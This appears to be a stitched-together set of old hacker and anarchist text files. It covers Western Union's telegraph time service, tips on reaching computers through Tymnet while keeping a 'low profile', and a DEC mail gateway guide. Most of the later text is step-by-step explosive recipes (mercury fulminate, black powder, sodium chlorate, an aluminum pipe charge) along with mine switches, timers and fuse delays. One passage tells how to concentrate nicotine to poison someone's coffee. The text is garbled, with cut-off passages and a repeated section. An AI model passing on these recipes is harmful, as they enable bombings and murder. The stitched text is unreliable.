tell them "collect five dollars and twenty cents" or whatever the cost was.
Telegrams, like phone calls, could be sent collect or billed third party.  If
you had an account with Western Union, i.e. a Telex machine in your office, you
could charge the calls there, but most likely you would simply send the
telegram from there in the first place.
 
Sometime in the early 1960's, Western Union filed suit against AT&T asking that
they turn over their TWX business to them.  They cited an earlier court ruling,
circa 1950's, which said AT&T was prohibited from acquiring any more telephone
operating companies except under certain conditions.  The Supreme Court agreed
with Western Union that "spoken messages" were the domain of Ma Bell, but
"written messages" were the domain of Western Union.  So Bell was required to
divest itself of the TWX network, and Western Union has operated it since,
although a few years ago they began phasing out the phrase "TWX" in favor of
"Telex II"; their original device being "Telex I" of course.  TWX still uses
ten digit dialing with 610 (Canada) or 710/910 (USA) being the leading three
digits.  Apparently 410-510 have been abandoned; or at least they are used very
little, and Bellcore has assigned 510 to the San Francisco area starting in a
year or so.  410 still has some funny things on it, like the Western Union
"Infomaster," which is a computer that functions like a gateway between Telex,
TWX, EasyLink and some other stuff.
 
Today, the Western Union network is but a skeleton of its former self.  Now
most of their messages are handled on dial up terminals connected to the public
phone network.  It has been estimated the TWX/Telex business is about fifty
percent of what it was a decade ago, if that much.
 
Then there was the Time Service, a neat thing which Western Union offered for
over seventy years, until it was discontinued in the middle 1960's.  The Time
Service provided an important function in the days before alternating current
was commonly available.  For example, Chicago didn't have AC electricity until
about 1945.  Prior to that we used DC, or direct current.
 
Well, to run an electric clock, you need 60 cycles AC current for obvious
reasons, so prior to the conversion from DC power to AC power, electric wall
clocks such as you see in every office were unheard of.  How were people to
tell the time of day accurately?  Enter the Western Union clock.
 
The Western Union, or "telegraph clock" was a spring driven wind up clock, but
with a difference.  The clocks were "perpetually self-winding," manufactured by
the Self-Winding Clock Company of New York City.  They had large batteries
inside them, known as "telephone cells" which had a life of about ten years
each.  A mechanical contrivance in the clock would rotate as the clock spring
unwound, and once each hour would cause two metal clips to contact for about
ten seconds, which would pass juice to the little motor in the clock which in
turn re-wound the main spring.  The principle was the same as the battery
operated clocks we see today.  The battery does not actually run the clock --
direct current can't do that -- but it does power the tiny motor which re-winds
the spring which actually drives the clock.
 
The Western Union clocks came in various sizes and shapes, ranging from the
smallest dials which were nine inches in diameter to the largest which were
about eighteen inches in diameter.  Some had sweep second hands; others did
not.  Some had a little red light bulb on the front which would flash.  The
typical model was about sixteen inches, and was found in offices, schools,
transportation depots, radio station offices, and of course in the telegraph
office itself.
 
The one thing all the clocks had in common was their brown metal case and
cream-colored face, with the insignia "Western Union" and their corporate logo
in those days which was a bolt of electricity, sort of like a letter "Z" laying
on its side.  And in somewhat smaller print below, the words "Naval Observatory
Time."
 
The local clocks in an office or school or wherever were calibrated by a
"master clock" (actually a sub-master) on the premises.  Once an hour on the
hour, the (sub) master clock would drop a metal contact for just a half second,
and send about nine volts DC up the line to all the local clocks.  They in turn
had a "tolerance" of about two minutes on both sides of the hour so that the
current coming to them would yank the minute hand exactly upright onto the
twelve from either direction if the clock was fast or slow.
 
The sub-master clocks in each building were in turn serviced by the master
clock in town; usually this was the one in the telegraph office.  Every hour on
the half hour, the master clock in the telegraph office would throw current to
the sub-masters, yanking them into synch as required.  And as for the telegraph
offices themselves, they were serviced twice a day by -- you guessed it -- the
Naval Observatory Master clock in Our Nation's Capitol, by the same routine.
Someone there would press half a dozen buttons at the same time, using all
available fingers; current would flow to every telegraph office and synch all
the master clocks in every community.  Western Union charged fifty cents per
month for the service, and tossed the clock in for free!  Oh yes, there was an
installation charge of about two dollars when you first had service (i.e. a
clock) installed.
 
The clocks were installed and maintained by the "clockman," a technician from
Western Union who spent his day going around hanging new clocks, taking them
out of service, changing batteries every few years for each clock, etc.
 
What a panic it was for them when "war time" (what we now call Daylight Savings
Time) came around each year!  Wally, the guy who serviced all the clocks in
downtown Chicago had to start on *Thursday* before the Sunday official
changeover just to finish them all by *Tuesday* following.  He would literally
rush in an office, use his screwdriver to open the case, twirl the hour hand
around one hour forward in the spring, (or eleven hours *forward* in the fall
since the hands could not be moved backward beyond the twelve going
counterclockwise), slam the case back on, screw it in, and move down the hall
to the next clock and repeat the process.  He could finish several dozen clocks
per day, and usually the office assigned him a helper twice a year for these
events.
 
He said they never bothered to line the minute hand up just right, because it
would have taken too long, and ".....anyway, as long as we got it within a
minute or so, it would synch itself the next time the master clock sent a
signal..."  Working fast, it took a minute to a minute and a half to open the
case, twirl the minute hand, put the case back on, "stop and b.s. with the
receptionist for a couple seconds" and move along.
 
The master clock sent its signal over regular telco phone lines.  Usually it
would terminate in the main office of whatever place it was, and the (sub)
master there would take over at that point.
 
Wally said it was very important to do a professional job of hanging the clock
to begin with.  It had to be level, and the pendulum had to be just right,
otherwise the clock would gain or lose more time than could be accommodated in
the hourly synching process.  He said it was a very rare clock that actually
was out by even a minute once an hour, let alone the two minutes of tolerance
built into the gear works.
 
     "...Sometimes I would come to work on Monday morning, and find out
     in the office that the clock line had gone open Friday evening.  So
     nobody all weekend got a signal.  Usually I would go down a manhole
     and find it open someplace where one of the Bell guys messed it up,
     or took it off and never put it back on.  To find out where it was
     open, someone in the office would 'ring out' the line; I'd go around
     downtown following the loop as we had it laid out, and keep listening
     on my headset for it.  When I found the break or the open, I would
     tie it down again and the office would release the line; but then I
     had to go to all the clocks *before* that point and restart them,
     since the constant current from the office during the search had
     usually caused them to stop."
 
But he said, time and again, the clocks were usually so well mounted and hung
that "...it was rare we would find one so far out of synch that we had to
adjust it manually.  Usually the first signal to make it through once I
repaired the circuit would yank everyone in town to make up for whatever they
lost or gained over the weekend..."
 
In 1965, Western Union decided to discontinue the Time Service.  In a nostalgic
letter to subscribers, they announced their decision to suspend operations at
the end of the current month, but said "for old time's sake" anyone who had a
clock was welcome to keep it and continue using it; there just would not be any
setting signals from the master clocks any longer.
 
Within a day or two of the official announcement, every Western Union clock in
the Chicago area headquarters building was gone.  The executives snatched them
off the wall, and took them home for the day when they would have historical
value.  All the clocks in the telegraph offices disappeared about the same
time, to be replaced with standard office-style electric wall clocks.

There are literally hundreds of systems connected to some of these larger
networks, like Tymnet and Telenet.  Navigation around these networks is very
simple, and usually well explained in their on-line documentation.
Furthermore, some systems will actually tell you what is connected and how to
get to it.  In the case of Tymnet, after dialing in, at the log in prompt, type
"information" for the on-line documentation.
 
Accessing systems through networks is as simple as providing an address for it
to connect to.  The best way to learn about the addresses and how to do things
on a network is to read "A Novice's Guide to Hacking (1989 Edition)" which was
in Issue 22, File 4 of 12, Volume Two (December 23, 1988).  Some points are
re-iterated here.
 
Once on a network, you provide the NUA (network user address) of the system you
wish to connect to.  NUAs are strings of 15 digits, broken up in to 3 fields,
the NETWORK ADDRESS, the AREA PREFIX, and the DNIC.  Each field has 5 digits,
and are left padded with 0's where necessary.
 
The DNIC determines which network to take the address from.  Tymnet, for
example, is 03106. 03110 is Telenet.
 
The AREA PREFIX and NETWORK ADDRESS determine the connection point.  By
providing the address of the system that you wish to connect to, you will be
accessing it through the net... as if you were calling it directly.  Obviously,
then, this provides one more level of security for access.
 
By connecting to an outdial, you can increase again the level of security you
enjoy, by using the outdial in that area to connect to the remote system.
 
Addendum -- Accessing Tymnet Over Local Packet Networks
 
This is just another way to get that extra step and/or bypass other routes.
This table is copied from Tymnet's on-line information.  As said earlier, it's
a great resource, this on-line information!

low profile, networks should provide a good access method.
 
If you can find a system that is connected to the Internet that you can get on
from Tymnet, you are doing well.

INTRODUCTION
 
DECWRL is a mail gateway computer operated by Digital's Western Research
Laboratory in Palo Alto, California.  Its purpose is to support the interchange
of electronic mail between Digital and the "outside world."
 
DECWRL is connected to Digital's Easynet, and also to a number of different
outside electronic mail networks.  Digital users can send outside mail by
sending to DECWRL::"outside-address", and digital users can also receive mail
by having your correspondents route it through DECWRL.  The details of incoming
mail are more complex, and are discussed below.
 
It is vitally important that Digital employees be good citizens of the networks
to which we are connected.  They depend on the integrity of our user community
to ensure that tighter controls over the use of the gateway are not required.
The most important rule is "no chain letters," but there are other rules
depending on whether the connected network that you are using is commercial or
non-commercial.
 
The current traffic volume (September 1989) is about 10,000 mail messages per
day and about 3,000 USENET messages per day.  Gatewayed mail traffic has
doubled every year since 1983.  DECWRL is currently a Vax 8530 computer with 48
megabytes of main memory, 2500 megabytes of disk space, 8 9600-baud (Telebit)
modem ports, and various network connections.  They will shortly be upgrading
to a Vax 8650 system.  They run Ultrix 3.0 as the base operating system.
 
 
ADMINISTRATION
 
The gateway has engineering staff, but no administrative or clerical staff.
They work hard to keep it running, but they do not have the resources to answer
telephone queries or provide tutorials in its use.
 
They post periodic status reports to the USENET newsgroup dec.general.  Various
helpful people usually copy these reports to the VAXNOTES "gateways" conference
within a day or two.
 
 
HOW TO SEND MAIL
 
DECWRL is connected to quite a number of different mail networks.  If you were
logged on directly to it, you could type addresses directly, e.g.
 
    To: strange!foreign!address.
 
But since you are not logged on directly to the gateway, you must send mail so
that when it arrives at the gateway, it will be sent as if that address had
been typed locally.
 
 
* Sending from VMS
 
If you are a VMS user, you should use NMAIL, because VMS mail does not know how
to requeue and retry mail when the network is congested or disconnected.  From
VMS, address your mail like this:
 
    To: nm%DECWRL::"strange!foreign!address"
 
The quote characters (") are important, to make sure that VMS doesn't try to
interpret strange!foreign!address itself.  If you are typing such an address
inside a mail program, it will work as advertised.  If you are using DCL and
typing directly to the command line, you should beware that DCL likes to remove
quotes, so you will have to enclose the entire address in quotes, and then put
two quotes in every place that one quote should appear in the address:
 
    $ mail test.msg "nm%DECWRL::""foreign!addr""" /subj="hello"
 
Note the three quotes in a row after foreign!addr.  The first two of them are
doubled to produce a single quote in the address, and the third ends the
address itself (balancing the quote in front of the nm%).
 
Here are some typical outgoing mail addresses as used from a VMS system:
 
    To: nm%DECWRL::"lll-winkin!netsys!phrack"
    To: nm%DECWRL::"postmaster@msp.pnet.sc.edu"
    To: nm%DECWRL::"netsys!phrack@uunet.uu.net"
    To: nm%DECWRL::"phrackserv@CUNYVM.bitnet"
    To: nm%DECWRL::"Chris.Jones@f654.n987.z1.fidonet.org"
 
 
* Sending from Ultrix
 
If your Ultrix system has been configured for it, then you can, from your
Ultrix system, just send directly to the foreign address, and the mail software
will take care of all of the gateway routing for you.  Most Ultrix systems in
Corporate Research and in the Palo Alto cluster are configured this way.
 
To find out whether your Ultrix system has been so configured, just try it and
see what happens.  If it doesn't work, you will receive notification almost
instantly.
 
    NOTE:  The Ultrix mail system is extremely flexible; it is almost
    completely configurable by the customer.  While this is valuable to
    customers, it makes it very difficult to write global instructions for
    the use of Ultrix mailers, because it is possible that the local changes
    have produced something quite unlike the vendor-delivered mailer.  One of
    the popular changes is to tinker with the meaning of quote characters (")
    in Ultrix addresses.  Some systems consider that these two addresses are
    the same:
 
        site1!site2!user@host.dec.com
 
    and
 
        "site1!site2!user"@host.dec.com
 
    while others are configured so that one form will work and the other
    will not.  All of these examples use the quotes.  If you have trouble
    getting the examples to work, please try them again without the quotes.
    Perhaps your Ultrix system is interpreting the quotes differently.
 
If your Ultrix system has an IP link to Palo Alto (type "/etc/ping
decwrl.dec.com" to find out if it does), then you can route your mail to the
gateway via IP.  This has the advantage that your Ultrix mail headers will
reach the gateway directly, instead of being translated into DECNET mail
headers and then back into Ultrix at the other end.  Do this as follows:
 
    To: "alien!address"@decwrl.dec.com
 
The quotes are necessary only if the alien address contains a ! character, but
they don't hurt if you use them unnecessarily.  If the alien address contains
an "@" character, you will need to change it into a "%" character.  For
example, to send via IP to joe@widget.org, you should address the mail
 
    To: "joe%widget.org"@decwrl.dec.com
 
If your Ultrix system has only a DECNET link to Palo Alto, then you should
address mail in much the same way that VMS users do, save that you should not
put the nm% in front of the address:
 
    To: DECWRL::"strange!foreign!address"
 
Here are some typical outgoing mail addresses as used from an Ultrix system
that has IP access.  Ultrix systems without IP access should use the same
syntax as VMS users, except that the nm% at the front of the address should not
be used.
 
    To: "lll-winken!netsys!phrack"@decwrl.dec.com
    To: "postmaster%msp.pnet.sc.edu"@decwrl.dec.com
    To: "phrackserv%CUNYVM.bitnet"@decwrl.dec.com
    To: "netsys!phrack%uunet.uu.net"@decwrl.dec.com
    To: "Chris.Jones@f654.n987.z1.fidonet.org"@decwrl.dec.com
 
 
DETAILS OF USING OTHER NETWORKS
 
All of the world's computer networks are connected together, more or less, so
it is hard to draw exact boundaries between them.  Precisely where the Internet
ends and UUCP begins is a matter of interpretation.
 
For purposes of sending mail, though, it is convenient to divide the network
universe into these categories:
 
Easynet         Digital's internal DECNET network.  Characterized by addresses
                of the form NODE::USER.  Easynet can be used for commercial
                purposes.
 
Internet        A collection of networks including the old ARPAnet, the NSFnet,
                the CSnet, and others.  Most international research,
                development, and educational organizations are connected in
                some fashion to the Internet.  Characterized by addresses of
                the form user@site.subdomain.domain.  The Internet itself
                cannot be used for commercial purposes.
 
UUCP            A very primitive network with no management, built with
                auto-dialers phoning one computer from another.  Characterized
                by addresses of the form place1!place2!user.  The UUCP network
                can be used for commercial purposes provided that none of the
                sites through which the message is routed objects to that.
 
USENET          Not a network at all, but a layer of software built on top of
                UUCP and Internet.
 
BITNET          An IBM-based network linking primarily educational sites.
                Digital users can send to BITNET as if it were part of
                Internet, but BITNET users need special instructions for
                reversing the process.  BITNET cannot be used for commercial

Fidonet         A network of personal computers.  I am unsure of the status of
                using Fidonet for commercial purposes, nor am I sure of its
                efficacy.
 
 
DOMAINS AND DOMAIN ADDRESSING
 
There is a particular network called "the Internet;" it is somewhat related to
what used to be "the ARPAnet."  The Internet style of addressing is flexible
enough that people use it for addressing other networks as well, with the
result that it is quite difficult to look at an address and tell just what
network it is likely to traverse.  But the phrase "Internet address" does not
mean "mail address of some computer on the Internet" but rather "mail address
in the style used by the Internet."  Terminology is even further confused
because the word "address" means one thing to people who build networks and
something entirely different to people who use them.  In this file an "address"
is something like "mike@decwrl.dec.com" and not "192.1.24.177" (which is what
network engineers would call an "internet address").
 
The Internet naming scheme uses hierarchical domains, which despite their title
are just a bookkeeping trick.  It doesn't really matter whether you say
NODE::USER or USER@NODE, but what happens when you connect two companies'
networks together and they both have a node ANCHOR??  You must, somehow,
specify which ANCHOR you mean.  You could say ANCHOR.DEC::USER or
DEC.ANCHOR::USER or USER@ANCHOR.DEC or USER@DEC.ANCHOR.  The Internet
convention is to say USER@ANCHOR.DEC, with the owner (DEC) after the name
(ANCHOR).
 
But there could be several different organizations named DEC.  You could have
Digital Equipment Corporation or Down East College or Disabled Education
Committee.  The technique that the Internet scheme uses to resolve conflicts
like this is to have hierarchical domains.  A normal domain isn't DEC or
STANFORD, but DEC.COM (commercial) and STANFORD.EDU (educational).  These
domains can be further divided into ZK3.DEC.COM or CS.STANFORD.EDU.  This
doesn't resolve conflicts completely, though:  both Central Michigan University
and Carnegie-Mellon University could claim to be CMU.EDU.  The rule is that the
owner of the EDU domain gets to decide, just as the owner of the CMU.EDU gets
to decide whether the Electrical Engineering department or the Elementary
Education department gets subdomain EE.CMU.EDU.
 
The domain scheme, while not perfect, is completely extensible.  If you have
two addresses that can potentially conflict, you can suffix some domain to the
end of them, thereby making, say, decwrl.UUCP be somehow different from
DECWRL.ENET.
 
DECWRL's entire mail system is organized according to Internet domains, and in
fact we handle all mail internally as if it were Internet mail.  Incoming mail
is converted into Internet mail, and then routed to the appropriate domain; if
that domain requires some conversion, then the mail is converted to the
requirements of the outbound domain as it passes through the gateway.  For
example, they put Easynet mail into the domain ENE           STATE           DENSITY  ACCESS NUMBER  NTWK

On a side note, the recent book The Cuckoo's Egg provides some interesting
information (in the form of a story, however) on a Tymnet hacker.  Remember
that he was into BIG things, and hence he was cracked down upon.  If you keep a
low profile, networks should provide a good access method.
 
If you can find a system that is connected to the Internet that you can get on
from Tymnet, you are doing well.

Username@f<node #>.n<net #>.z<zone #>.ifna.org
 
In other words, if I wanted to mail to Silicon Swindler at 1:135/5, the address
would be Silicon_Swindler@f5.n135.z1.ifna.org and, provided that your mailer
knows the .ifna.org domain, it should get through alright.  Apparently, as of
the writing of this article, they have implemented a new gateway name called
fidonet.org which should work in place of ifna.org in all routings.  If your
mailer does not know either of these domains, use the above routing but replace
the first "@" with a "%" and then afterwards, use either of the following
mailers after the "@":  CS.ORST.EDU or K9.CS.ORST.EDU (i.e. username%f<node
#>.n<net #>.z<zone #>.fidonet.org@CS.ORST.EDU [or replace CS.ORST.EDU with
K9.CS.ORST.EDU]).
 
The following is a list compiled by Bill Fenner (WCF@PSUECL.BITNET) that was
posted on INFONETS DIGEST which lists a number of FIDONET gateways:
 
Net      Node    Node Name
~~~      ~~~~    ~~~~~~~~~
104      56      milehi.ifna.org
105      55      casper.ifna.org
107      320     rubbs.ifna.org
109      661     blkcat.ifna.org
125      406     fidogate.ifna.org
128      19      hipshk.ifna.org
129      65      insight.ifna.org
143      N/A     fidogate.ifna.org
152      200     castle.ifna.org
161      N/A     fidogate.ifna.org
369      17      megasys.ifna.org
 
NOTE:  The UUCP equivalent node name is the first part of the node name.  In
       other words, the UUCP node milehi is listed as milehi.ifna.org but can
       be mailed directly over the UUCP network.
 
Another way to mail to FIDONET, specifically for Internet people, is in this
format:
 
ihnp4!necntc!ncoast!ohiont!<net #>!<node #>!user_name@husc6.harvard.edu
 
And for those UUCP mailing people out there, just use the path described and
ignore the @husc5.harvard.edu portion. There is a FIDONET NODELIST available on
most any FIDONET bulletin board, but it is quite large.
 
ONTYME
~~~~~~
Previously known as Tymnet, OnTyme is the McDonnell Douglas revision.  After
they bought out Tymnet, they renamed the company and opened an experimental
Internet gateway at ONTYME.TYMNET.COM but this is supposedly only good for
certain corporate addresses within McDonnell Douglas and Tymnet, not their
customers.  The userid format is xx.yyy or xx.y/yy where xx is a net name and
yyy (or y/yy) is a true username.  If you cannot directly nail this, try:

Procedure
---------

1) Mix 1/2 cup of salt into the one gallon glass jar with 3 litres (3 
quarts) of water.
2) Add 2 teaspoons of battery acid to the solution and stir vigorously 
for 5 minutes.
3) Strip about 4 inches of insulation from both ends of the two wires.
4) With knife and sticks, shape 2 strips of wood 1 by 1/8 by 1-1/2. Tie 
the wood strips to the lead or carbon rods so that they are 1-1/2 incles 
apart.
5) Connect the rods to the battery in a motor vehicle with the insulated 
wire.
6) Submerge 4-1/2 inches of the rods in the salt water solution.
7) With gear in neutral position, start the vehicle engine. Depress the 
accelerator approx. 1/5 of its full travel.
8) Run the engine with the accelerator in this position for 2 hours, then 
shut it down for 2 hours.
9) Repeat this cycle for a total of 64 hours while maintaining the level 
of the acid-salt water solution in the glass jar.

CAUTION: This arrangement employs voltages which can be quite dangerous! 
Do not touch bare wire leads while engine is running!!

10) Shut off the engine. Remove the rods from the glass jar and 
disconnect wire leads from the battery.
11) Filter the solution through the heavy cloth into a flat pan or tray, 
leaving the sediment at the bottom of the glass jar.
12) Allow the water in the filtered solution to evaporate at room 
temperature (approx. 16 hours). The residue is approximately 60% or more 
sodium chlorate which is pure enough to be used as an explosive 
ingredient.

  MERCURY FULMINATE 2                           - Mondain -

     Mercury fulminate is perhaps one of the oldest known initiating
compounds. It can be detonated by either heat or shock, which would make it of
infinite value to a terrorist.  Even the action of dropping a crystal of the
fulminate causes it to explode.  A person making this material would probably
use the following procedure:

     MATERIALS                  EQUIPMENT
                       
     5 g mercury               glass stirring rod

     35 ml concentrated         100 ml beaker (2)
     nitric acid

     ethyl alcohol (30 ml)      adjustable heat source

     distilled water            blue litmus paper

                                funnel and filter paper

     Solvent alcohol must be at least 95% ethyl alcohol if it is used to make
mercury fulminate. Methyl alcohol may prevent mercury fulminate from forming.

     Mercury thermometers are becoming a rarity, unfortunately.  They may be
hard to find in most stores as they have been superseded by alcohol and other
less toxic fillings. Mercury is also used in mercury switches, which are
available at electronics stores. Mercury is a hazardous substance, and should
be kept in the thermometer or mercury switch until used. It gives off mercury
vapors which will cause brain damage if inhaled.  For this reason, it is a
good idea not to spill mercury, and to always use it outdoors. Also, do not
get it in an open cut; rubber gloves will help prevent this.

1) In one beaker, mix 5 g of mercury with 35 ml of concentrated nitric acid,
   using the glass rod.

2) Slowly heat the mixture until the mercury is dissolved, which is when the
   solution turns green and boils.

3) Place 30 ml of ethyl alcohol into the second beaker, and slowly and
   carefully add all of the contents of the first beaker to it.  Red and/or
   brown fumes should appear. These fumes are toxic and flammable.

4) After thirty to forty minutes, the fumes should turn white, indicating that
   the reaction is near completion.  After ten more minutes, add 30 ml of the
   distilled water to the solution.

5) Carefully filter out the crystals of mercury fulminate from the liquid
   solution.  Dispose of the solution in a safe place, as it is corrosive and
   toxic.

6) Wash the crystals several times in distilled water to remove as much excess
   acid as possible.  Test the crystals with the litmus paper until they are
   neutral.   This will be when the litmus paper stays blue when it touches
   the wet crystals

7) Allow the crystals to dry, and store them in a safe place, far away from
   any explosive or flammable material.

       This procedure can also be done by volume, if the available mercury
cannot be weighed.  Simply use 10 volumes of nitric acid and 10 volumes of
ethanol to every one volume of mercury.

Improvised Black Powder                             by the Jolly Roger

     Black powder can be prepared in a simple, safe manner. It may be used as 
blasting or gun powder.

Material Required
-----------------

Potassium Nitrate, granulated, 3 cups (3/4 liter)
Wood charcoal, powdered, 2 cups
Sulfur, powdered, 1/2 cup
Alcohol, 5 pints (2-1/2 liters) (whiskey, rubbing alcohol, etc.)
Water, 3 cups (3/4 liter)
Heat source
2 buckets - each 2 gallon (7-1/2 litres) capacity, at least one of which is 
     heat resistant (metal, ceramic, etc.)
Flat window screening, at least 1 foot (30 cm) square
Large wooden stick
Cloth, at leat 2 feet (60 cm) square

Procedure:
---------

1) Place alcohol in one of the buckets.
2) Place potassium nitrate, charcoal, and sulfur in the heat resistant 
bucket. Add 1 cup water and mix thoroughly with wooden stick until all 
ingrediants are dissolved.
3) Add remaining water (2 cups) to mixture. Place bucket on heat source and 
stir until small bubbles begin to form.

CAUTION: DO NOT boil mixture. Be sure ALL mixture stays wet. If any is dry, 
as on sides of pan, it may ignite!

4) Remove bucket from heat and pour mixture into alcohol while stirring 
vigorously.
5) Let alcohol mixture stand about 5 minutes. Strain mixture through cloth to 
obtain black powder. Discard liquid. Wrap cloth around black powder and 
squeeze to remove all excess liquid.
6) Place screening over dry bucket. Place workable amount of damp powder on 
screen and granulate by rubbing solid through screen. NOTE: If granulated 
particles appear to stick together and change shape, recombine entire batch 
of powder and repeat steps 5 & 6.
7) Spread granulated black powder on flat, dry surface so that layer about 
1/2 inch (1-1/4 cm) is formed. Allow to dry. Use radiator, or direct 
sunlight. This should be dried as soon as possible, preferably in an hour. 
The longer the drying period, the less effective the black powder.

CAUTION: Remove from heat AS SOON AS granules are dry. Black powder isnow 
ready to use.


Used in CBIV, '95                     -= Mondain =-    NITRIC ACID                               -= Mondain =-  '95

       There are several ways to make this most essential of all acids for  
explosives. One method by which it could be made will be presented. Once  
again, be reminded that these methods SHOULD NOT BE CARRIED OUT!!

     Materials:                             Equipment:
                                   
     sodium nitrate or                      adjustable heat source     
     potassium nitrate
                                            retort
     distilled water
                                            ice bath
     concentrated
     sulfuric acid                          stirring rod

                                            collecting flask with stopper

1) Pour 32 milliliters of concentrated sulfuric acid into the retort.

2) Carefully weigh out 58 grams of sodium nitrate, or 68 grams of potassium
nitrate. and add this to the acid slowly.  If it all does not dissolve,
carefully stir the solution with a glass rod until it does.

3) Place the open end of the retort into the collecting flask, and place the   
collecting flask in the ice bath.

4) Begin heating the retort, using low heat.  Continue heating until liquid
begins to come out of the end of the retort.  The liquid that forms is nitric
acid.  Heat until the precipitate in the bottom of the retort is almost dry,
or until no more nitric acid is forming.  CAUTION: If the acid is headed too
strongly, the nitric acid will decompose as soon as it is formed.  This can
result in the production of highly flammable and toxic gasses that may
explode.  It is a good idea to set the above apparatus up, and then get away
from it.

     Potassium nitrate could also be obtained from store-bought black powder,
simply by dissolving black powder in boiling water and filtering out the sulfur
and charcoal. To obtain 68 g of potassium nitrate, it would be necessary to
dissolve about 90 g of black powder in about one litre of boiling water. Filter
the dissolved solution through filter paper in a funnel into a jar until the
liquid that pours through is clear. The charcoal and sulfur in black powder are
insoluble in water, and so when the solution of water is allowed to evaporate,
potassium nitrate will be left in the jar.

Carbon-Tet Explosive                            by the Jolly Roger

     A moist explosive mixture can be made from fine aluminum powder combined 
with carbon tetrachloride or tetrachloroethylene. This explosive can be 
detonated with a blasting cap.

Material Required                                 Source

Procedure:
---------

1) Measure out two parts aluminum powder to one part carbon tetrachloride or 
tetrachlorethylene liquid into mixing container, adding liquid to powder 
while stirring with the wooden rod.
2) Stir until the mixture becomes the consistency of honey syrup.

CAUTION: Fumes from the liquid are dangerous and should not be inhaled.

3) Store explosive in a jar or similar water proof container until ready to 
use. The liquid in the mixture evaporates quicky when not confined.

NOTE: Mixture will detonate in this manner for a period of 72 hours.

How to Use:
----------

1) Pour this mixture into an iron or steel pipe which has an end cap threaded 
on one end. If a pipe is not available, you may use a dry tin can or glass 
jar.
2) Insert blasting cap just beneath the surface of the explosive mix.

NOTE: Confining the open end of the container will add to the effectiveness 
of the explosive.

     When the flat piece of wood is removed by pulling the string, the 
jaws of the clothespin will close, completing the circuit.

CAUTION: Do not attach the battery until the switch and trip wire have 
been emplaced and examined. Be sure that the flat piece of wood is 
seperating the jaws of the switch.

Revised '95.   -= Mondain =-Flexible Plate Switch                             by the Jolly Roger

     This flexible plate switch is used for initiating emplaced mines and 
explosives.

Material Required:
-----------------

Two flexible metal sheets
  one approximately 10 in. (25 cm) square
  one approximately 10 in. x 8 in. (20 cm)
Piece of wood 10 in. square x 1 in. thick
Four soft wood blocks 1 in. x 1 in. x 1/4 in.
Eight flat head nails, 1 in. long
Connecting wires
Adhesive tape

Procedure:
---------

1) Nail 10 in. by 8 in. metal sheet to 10 in. square piece of wood so that 
1 in. of wood shows on each side of the metal. Leave one of the nails 
sticking up about 1/4 in.
2) Strip insulation from the end of one connecting wire. Wrap this end 
around the nail and drive the nail all the way in.
3) Place the four wood blocks on the corners of the wood base.
4) Place the 10 in. square flexible metal sheet so that it rests on the 
blocks in line with the wood base.
5) Drive four nails through the metal sheet and the blocks (1 per block) 
to fasten the sheet to the wood base. A second connecting wire is atached 
to one of the nails as in step #2.
6) Wrap the adhesive tape around the edges of the plate and wood base. 
This will assure that no dirt or other foreign matter will get between the 
plates and prevent the switch from operating.

How to use:
----------

The switch is placed in a hole in the path of expected traffic and covered 
with a thin layer of dirt or other camouflaging material. The mine or 
other explosive device connected to the switch can be buried with the 
switch or emplaced elsewhere as desired.

When a vehicle passes over the switch, the two metal plates make contact 
closing the firing circuit.

     A variation on the standard cigarette display was invented by my good
friend Atur (THE Pyromaniac). Rather than inserting the fuse into the SIDE
of the cigarette (and risk splitting it) half of the filter is cut off, and a
small hole is punched THROUGH the remainder of the filter and into the
tobacco.

     The fuse is inserted as far as possible into this hole, then taped or
glued in place, or the cigarette can be cut and punched ahead of time and
lit normally, then attached to the fuse at the scene.

     A similar type of device can be make from powdered charcoal and a sheet
of paper.  Simply roll the sheet of paper into a thin tube, and fill it with
powdered charcoal. Punch a hole in it at the desired location, and insert a
fuse. Both ends must be glued closed, and one end of the delay must be doused
with lighter fluid before it is lit. Or, a small charge of gunpowder mixed
with powdered charcoal could conceivably used for igniting such a delay. A
chain of charcoal briquettes can be used as a delay by merely lining up a few
bricks of charcoal so that they touch each other, end on end, and lighting the
first brick. Incense, which can be purchased at almost any novelty or party
supply store, can also be used as a fairly reliable delay. By wrapping the
fuse about the end of an incense stick, delays of up to 1/2 an hour are
possible.

Nicotine                                      by the Jolly Roger

     Nicotine is an abundant poison. Easily found in tobacco 
products, in concentrated form a few drops can quickly kill 
someone. Here is how to concentrate it:

     First get a can of chewing tobacco or pipe tobacco. Remove 
the contents and soak in water overnight in a jar (about 2/3 cup 
of water will do...). In the morning, strain into another jar the 
mixture through a porous towel. Then wrap the towel around the 
ball of tobacco and squeeze it until all of the liquid is in the 
jar. Throw away the tobacco--you will not need it anymore.

     Now you have two options. I recommend the first. It makes the 
nicotine more potent.
     1) Allow to evaporate until a sticky syrup results in the 
jar. This is almost pure nicotine (hell, it is pure enough for 
sure!). 
     2) Heat over low flame until water is evaporated and a thick 
sticky syrup results (I don't know how long it takes... shouldn't 
take too long, though.).

     Now all you have to do, when you wish to use it, is to put 
a few drops in a medicine dropper or equivalent, and slip about 4 
or 5 drops into the victim's coffee. Coffee is recommended since it 
will disguise the taste. Since nicotine is a drug, the victim 
should get quite a buzz before they turn their toes up to the 
daisies, so to speak.

     Note: If the syrup is too sticky, dilute it with a few drops 
of water. And while you are at it, better add an extra drop to the 
coffee just to be sure!

 Revised in '95,,.....   -= Mondain =-Dried Seed Timer                                    by the Jolly Roger

     A time delay device for electrical firing circuits can be made using 
the principle of expansion of dried seeds.

Material Required:
-----------------

Dried peas, beans, or oter dehydrated seeds
Wide-mouth glass jar with non-metal cap
Two screws or bolts
Thin metal plate
Hand drill
Screwdriver

Procedure:
---------
1) Determine the rate of the rise of the dried seeds selected. This is 
necessary to determine the delay time of the timer.
     a) Place a sample of the dried seeds in the jar and cover with 
        water.
     b) Measure the time it takes for the seeds to rise a given height. 
        Most dried seeds increase 50% in one to two hours.
2) Cut a disc from thin metal plate. Disc should fit loosely inside the 
jar.

NOTE: If metal is painted, rusty, or otherwise coated, it must be scraped 
or sanded to obtain a clean metal surface

3) Drill two holes in the cap of the jar about 2 inches apart. Diameter 
of holes should be such that screws or bolts will thread tightly into 
them. If the jar has a metal cap or no cap, a piece of wood or plastic 
(NOT METAL) can be used as a cover.
4) Turn the two screws or bolts through the holes in the cap. Bolts 
should extend about one in. (2 1/2 cm) into the jar.

IMPORTANT: Both bolts must extend the same distance below the container 
cover.

5) Pour dried seeds into the container. The level will depend upon the 
previously measured rise time and the desired delay.
6) Place the metal disc in the jar on top of the seeds.

How to use:
----------

1) Add just enough water to completely cover the seeds and place the cap 
on the jar.
2) Attach connecting wires from the firing circuit to the two screws on 
